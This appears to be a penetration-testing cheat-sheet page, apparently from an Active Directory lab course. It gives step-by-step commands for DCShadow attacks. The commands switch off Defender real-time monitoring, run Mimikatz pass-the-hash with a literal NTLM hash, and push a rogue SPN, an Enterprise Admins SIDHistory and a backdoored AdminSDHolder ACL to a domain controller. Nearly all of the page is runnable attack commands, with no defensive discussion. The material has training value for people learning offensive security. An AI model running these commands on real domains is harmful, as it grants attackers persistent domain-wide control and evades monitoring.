---
layout: page
title: "# DCShadow - Set SPN, Set SIDHistory, Modify params of AdminSDHolder"
permalink: /ad_cheatsheets/dcshadow_set_spn_sidhistory_mod_params_adminsdholder
---

# DCShadow - Set SPN, Set SIDHistory, Modify params of AdminSDHolder

## Running Mimikatz.exe

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

.\mimikatz.exe

```

## Modify SPN of root user

```powershell
lsadump::dcshadow /object:root648user /attribute:servicePrincipalName /value:"DCReplication/DC648"
```

## Push Attributes

```powershell
sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate

lsadump::dcshadow /push
```

## Checking SPN

```powershell
Get-NetUser -UserName root648user | select serviceprincipalname
```

## Set SIDHistory

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:moneycorp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'

. C:\AD\Tools\Set-DCShadowPermissions.ps1 PS C:\AD\Tools> Set-DCShadowPermissions -FakeDC mcorp-student648 -SAMAccountName root648user -Username student648 -Verbose
```

### Push Attributes

```powershell
lsadump::dcshadow /object:root648User /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

lsadump::dcshadow /push
```

### Getting SID

```powershell
Get-NetUser -UserName student648 | select objectsid
```

```powershell
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-280534878-1496970234-700767426-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-1213)

lsadump::dcshadow /push
```

## Resources

[DCShadow](https://book.hacktricks.xyz/windows/active-directory-methodology/dcshadow)

[SIDHistory - Active Directory Security](https://adsecurity.org/?tag=sidhistory)
